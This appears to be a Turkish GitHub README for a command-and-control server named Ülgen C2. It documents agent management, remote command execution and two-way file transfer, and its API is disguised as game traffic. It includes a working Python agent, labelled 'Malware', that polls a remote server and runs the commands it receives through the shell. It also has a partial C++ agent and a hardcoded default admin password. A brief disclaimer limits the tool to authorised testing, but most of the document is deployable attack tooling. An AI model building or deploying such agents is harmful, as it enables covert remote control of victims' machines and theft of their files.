# 🎯 Ülgen C2 - Komut Kontrol Sunucusu[https://img.shields.io/badge/version-2.0-blue](https://img.shields.io/badge/version-2.0-blue" title="" target="_blank" rel="noreferrer)[https://img.shields.io/badge/node-18%252B-green](https://img.shields.io/badge/node-18%252B-green" title="" target="_blank" rel="noreferrer)[https://img.shields.io/badge/license-MIT-orange](https://img.shields.io/badge/license-MIT-orange" title="" target="_blank" rel="noreferrer)Ülgen
 C2, güvenlik testleri ve eğitim amaçlı geliştirilmiş, çift portlu bir 
Komut Kontrol (Command &amp; Control) sunucusudur. Ajanları yönetmek, 
komut çalıştırmak ve dosya transferi yapmak için tasarlanmıştır.## 📋 İçindekilerÖzelliklerMimari YapıKurulumKullanımAPI DokümantasyonuAjan (Malware) GeliştirmeGüvenlik UyarılarıSık Sorulan Sorular## ✨ Özellikler### 🔧 Temel ÖzelliklerÇift Port Mimarisi: 443 (ajan iletişimi) ve 9998 (yönetici paneli)HTTPS Tabanlı: Tüm iletişim SSL/TLS ile şifrelenirÇoklu Ajan Desteği: Aynı anda birden fazla ajanı yönetebilmeGerçek Zamanlı Güncelleme: Server-Sent Events ile anlık ajan takibi### 📁 Dosya YönetimiÇift Yönlü Transfer: Ajan'dan sunucuya / sunucudan ajan'a dosya göndermeBase64 Encode: Büyük dosyalar için optimize edilmiş transferOtomatik İndirme: Files sayfasında tek tıkla browser'a indirmeKalıcı Depolama: Sunucu restartında dosyalar kaybolmaz### 🖥️ Yönetici PaneliModern Arayüz: Koyu tema, yeşil neon renklerCanlı Ajan Listesi: Bağlı ajanları anlık görüntülemeKomut Terminali: Ajanlara direkt komut göndermeDosya Gezgini: Tüm transfer edilen dosyaları listelemeDizin Gezintisi: cd, ls, pwd komutları ile ajanın dosya sisteminde gezinme## 🏗️ Mimari Yapıtext┌─────────────────┐     443      ┌──────────────┐
│     Ajanlar     │ ◄─────────── │   C2 Sunucu  │
│  (Malware)      │              │  (Node.js)   │
└─────────────────┘              └──────┬───────┘
                                        │ 9998
                                   ┌────▼──────┐
                                   │ Yönetici  │
                                   │  Paneli   │
                                   └───────────┘### Port YapısıPortKullanımAçıklama443Ajan APIAjanların bağlandığı, komut alıp veri gönderdiği port9998Yönetici PaneliWeb arayüzü, ajan yönetimi ve dosya transferi### Klasör Yapısıtextc2-server/
├── 📁 certs/                 # SSL sertifikaları
├── 📁 public/                 # Web arayüzü dosyaları
│   ├── 📄 login.html
│   ├── 📄 dashboard.html
│   └── 📄 files.html
├── 📁 uploads/                # Ajandan gelen dosyalar (kalıcı)
├── 📁 downloads/              # Ajana giden dosyalar (geçici)
├── 📄 server.js                # Ana sunucu kodu
├── 📄 package.json
└── 📄 README.md## 🚀 Kurulum### GereksinimlerNode.js 18+npm veya yarnOpenSSL (sertifika oluşturmak için)sudo yetkisi (443 portu için)### Adım Adım Kurulumbash# 1. Repoyu klonla
git clone https://github.com/Subutay-CyberSecurity/Ulgen-Control-And-Commad-Server.git
cd Ulgen-Control-And-Commad-Server

# 2. Bağımlılıkları yükle
npm install

# 3. SSL sertifikası oluştur
mkdir certs
cd certs
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
# Common Name'e sunucu IP'ni yaz (örn: 192.168.1.45)
cd ..

# 4. Klasörleri oluştur
mkdir uploads downloads

# 5. Sunucuyu başlat
sudo node server.js### Docker ile Kurulum (Opsiyonel)bash# Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 443 9998
CMD ["node", "server.js"]

# Build ve run
docker build -t ulgen-c2 .
docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2## 🎮 Kullanım### Yönetici PaneliTarayıcından https://&lt;sunucu_ip&gt;:9998 adresine gitŞifre: mow0BEBWgooxBLCiAVTmDashboard: Ajanları görüntüle, komut gönderFiles: Transfer edilen dosyaları indir### Komut Göndermetextwhoami              - Kullanıcı adını öğren
ipconfig/ifconfig   - IP bilgilerini al
ls -la              - Dosyaları listele
cd /home/user       - Dizin değiştir
pwd                 - Mevcut dizini göster
upload file.txt     - Dosyayı sunucuya gönder
download file_id    - Sunucudan dosya indir
info                - Sistem bilgilerini getir
help                - Yardım menüsü### Dosya Transferi#### 📤 Ajan'a Dosya Gönderme (Admin → Ajan)Dashboard'da ajanı seç"DOSYA SEÇ" ile dosyayı seç"DOSYA GÖNDER" butonuna tıkla#### 📥 Ajandan Dosya Alma (Ajan → Admin)Dashboard'da ajanı seç"DOSYA YOLU" kısmına dosya yolunu yaz"DOSYA İSTE" butonuna tıklaDosya otomatik browser'a iner## 📡 API Dokümantasyonu### 1. Ajan KaydıhttpPOST /api/game/register
Content-Type: application/json

{
    "playerId": "agent_pc_user_abc123",
    "playerName": "pc_user",
    "system_info": {
        "hostname": "victim-pc",
        "system": "Windows",
        "username": "user"
    }
}### 2. Komut KontrolühttpGET /api/game/status/{agentId}

Response:
{
    "success": true,
    "gameData": {
        "command": "whoami",
        "command_id": "cmd_123456789_abc123"
    }
}### 3. Komut Çıktısı GöndermehttpPOST /api/game/data
Content-Type: application/json

{
    "playerId": "agent_...",
    "action": "command_output",
    "data": {
        "command_id": "cmd_...",
        "command": "whoami",
        "output": "root\n"
    }
}### 4. Dosya YüklemehttpPOST /api/agent/upload
Content-Type: application/json

{
    "agentId": "agent_...",
    "file": {
        "name": "file.txt",
        "size": 12345,
        "content": "base64_encoded_content"
    }
}### 5. Dosya İndirmehttpGET /api/files/{fileId}/download
# Response: Binary file## 🐍 Ajan (Malware) Geliştirme### Python Örneğipython#!/usr/bin/env python3
import requests
import time
import subprocess
import base64
import platform
import uuid

SERVER = "https://192.168.1.45:443"
agent_id = f"agent_{platform.node()}_{uuid.uuid4().hex[:4]}"

# SSL uyarılarını kapat
import urllib3
urllib3.disable_warnings()

# Kayıt ol
requests.post(f"{SERVER}/api/game/register", 
              json={"playerId": agent_id},
              verify=False)

while True:
    # Komut kontrolü
    r = requests.get(f"{SERVER}/api/game/status/{agent_id}", verify=False)
    data = r.json().get('gameData', {})
    
    if 'command' in data:
        cmd = data['command']
        cmd_id = data['command_id']
        
        # Komut çalıştır
        result = subprocess.run(cmd, shell=True, 
                               capture_output=True, text=True)
        
        # Sonuç gönder
        requests.post(f"{SERVER}/api/game/data", json={
            "playerId": agent_id,
            "action": "command_output",
            "data": {
                "command_id": cmd_id,
                "command": cmd,
                "output": result.stdout or result.stderr
            }
        }, verify=False)
    
    time.sleep(3)### C++ Örneği (libcurl ile)cpp#include &lt;iostream&gt;
#include &lt;curl/curl.h&gt;
#include &lt;nlohmann/json.hpp&gt;

int main() {
    CURL* curl = curl_easy_init();
    std::string agent_id = "agent_" + getHostname();
    
    // Register
    std::string data = "{\"playerId\":\"" + agent_id + "\"}";
    curl_easy_setopt(curl, CURLOPT_URL, "https://192.168.1.45:443/api/game/register");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_perform(curl);
    
    while(true) {
        // Command check
        std::string url = "https://192.168.1.45:443/api/game/status/" + agent_id;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_perform(curl);
        
        Sleep(3000);
    }
}## ⚠️ Güvenlik Uyarıları### 🔒 Önemli NotlarBu araç sadece eğitim ve güvenlik testleri içindirİzinsiz kullanımı yasa dışıdırKendi ağınızda veya izinli sistemlerde test edinVarsayılan şifreyi değiştirin (PASSWORD sabiti)### 🔐 Güvenlik Önlemlerijavascript// Varsayılan şifreyi değiştir
const PASSWORD = 'kendi_güçlü_şifren';

// SSL sertifikalarını güvende tut
chmod 600 certs/key.pem### 📝 Production İpuçlarıGüçlü bir SSL sertifikası kullanın (Let's Encrypt)Rate limiting ekleyinİzleme ve loglama yapınDüzenli yedekleme alınGüvenlik duvarında sadece gerekli portları açın## ❓ Sık Sorulan Sorular### Sunucu başlamıyor, "EACCES" hatası alıyorum?443 portu için root yetkisi gerekir:bashsudo node server.js### Dosyalar gözükmüyor, restart'ta sıfırlanıyor?Yeni versiyonda uploads/ klasörü taranır. Eski dosyalar için:bash# Uploads klasörünü kontrol et
ls -la uploads/
# Dosyalar varsa, server.js'de scanUploadsFolder() çalışıyor mu kontrol et### Ajan bağlanamıyor, SSL hatası alıyorum?Self-signed sertifika kullanıyorsan verify=False kullan:pythonrequests.get(url, verify=False)### Performance için öneriler?CHECK_INTERVAL = 3 (çok sık kontrol etmeyin)Dosya limiti: 500mb (çok büyük dosyalar sorun çıkarır)Heartbeat: 60 saniye (trafiği azaltır)## 🤝 Katkıda BulunmaFork'laFeature branch oluştur (git checkout -b yeni-ozellik)Değişiklikleri commit et (git commit -am 'Yeni özellik eklendi')Branch'i pushla (git push origin yeni-ozellik)Pull Request aç## 📞 İletişimGitHub: [@Subutay-CyberSecurity](https://github.com/Subutay-CyberSecurity" target="_blank" rel="noreferrer)## 📜 LisansBu proje MIT lisansı ile lisanslanmıştır. Detaylar için [LICENSE](https://LICENSE" target="_blank" rel="noreferrer) dosyasına bakın.
